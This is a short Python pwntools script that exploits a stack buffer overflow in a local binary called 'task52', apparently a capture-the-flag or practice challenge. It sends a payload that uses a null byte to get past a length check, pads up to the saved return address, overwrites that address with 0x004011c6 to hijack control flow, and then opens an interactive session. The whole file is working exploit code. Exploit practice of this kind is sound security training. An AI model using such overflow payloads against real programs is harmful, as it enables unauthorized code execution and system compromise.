from pwn import *


io = process("./task52")

io.recvuntil("Enter password:")

# gdb.attach(io)

addr = 0x004011c6
payload  = b'A' * 8 + b'\0' # bypass length check of 8
payload += b'A' * 0x1f      # overflow until the return address
payload += p64(addr)        # override ret address
io.sendline(payload)

# gdb.attach(io)
# pause()

io.interactive()
